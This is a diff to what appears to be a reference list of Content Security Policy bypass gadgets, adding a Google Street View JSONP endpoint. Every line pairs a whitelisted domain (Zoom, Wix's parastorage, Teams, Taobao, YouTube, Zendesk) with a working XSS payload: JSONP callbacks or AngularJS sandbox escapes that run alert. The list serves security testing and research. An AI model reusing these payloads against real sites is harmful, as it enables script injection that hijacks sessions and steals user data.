@@ -230,6 +230,7 @@ st3.zoom.us	<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.
 static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 statics.teams.cdn.office.net <script src=https://statics.teams.cdn.office.net/hashed/0.2-angular-jquery.min-eee9041.js></script><div ng-app>{{x={"n":"".constructor.prototype};x["n"].charAt=[].join;$eval("x=alert(1)");}}</div>
 storemapper-herokuapp-com.global.ssl.fastly.net	<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>
+streetviewpixels-pa.googleapis.com <script src="https://streetviewpixels-pa.googleapis.com/v1/tile?cb_client=apiv3&panoid=y8IQXMsYAZ2S9TCAFd_xNw&output=tile&x=0&y=0&zoom=0&nbt=1&fover=2&callback=alert(1)"></script>
 suggest.taobao.com	<script src="https://suggest.taobao.com/sug?callback=alert"></script>
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>
 support.zendesk.com	<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>
